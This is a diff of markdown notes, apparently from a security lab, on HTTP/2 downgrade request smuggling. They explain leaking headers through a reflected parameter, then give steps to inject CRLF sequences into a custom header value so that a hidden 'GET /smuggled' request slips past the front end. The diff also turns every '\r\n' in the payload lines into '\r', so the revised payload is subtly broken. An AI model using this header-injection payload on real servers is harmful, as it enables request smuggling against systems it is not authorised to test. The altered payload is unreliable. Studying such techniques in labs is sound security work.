@@ -8,7 +8,7 @@
 
 ### To leak such headers, we can abuse any functionality in the backend application that reflects a parameter from the request into the response. In our case, the application reflects whatever data is sent to /hello through the q POST parameter.
 
-### Most browsers will add this header to all HTTP/2 requests so that the backend will still receive a valid Content-Length header if an HTTP downgrade occurs. In the backend, the request would be converted into HTTP/1.1. 
+### Most browsers will add this header to all HTTP/2 requests so that the backend will still receive a valid Content-Length header if an HTTP downgrade occurs. In the backend, the request would be converted into HTTP/1.1.
 
 ## Steps:
 
@@ -24,7 +24,7 @@
 
 #### 6) Create a custom HTTP Header (Example: Foo: bar)
 
-#### 7) Send the request 
+#### 7) Send the request
 
 #### 8) In the inspector, click on the arrow beside our custom header and edit it to our desired value.
 
@@ -46,7 +46,7 @@
 
 #### POST /legit HTTP/2
 
-#### Host: IP_ADDRESS:PORT
+#### Host: IP\_ADDRESS:PORT
 
 #### User-Agent: Mozilla/5.0
 
@@ -56,17 +56,17 @@
 
 #### Edit the Foo header from the inspector tab
 
-#### bar\r\n
+#### bar\r
 
-#### Host: IP_ADDRESS:PORT\r\n
+#### Host: IP\_ADDRESS:PORT\r
 
-#### Content-Length: 0\r\n
+#### Content-Length: 0\r
 
-#### \r\n
+#### \r
 
-#### GET /smuggled HTTP/1.1\r\n
+#### GET /smuggled HTTP/1.1\r
 
-#### X-Fake: a 
+#### X-Fake: a
 
 ### NOTE: Don't forget to disable update content-length (Gear icon)
 
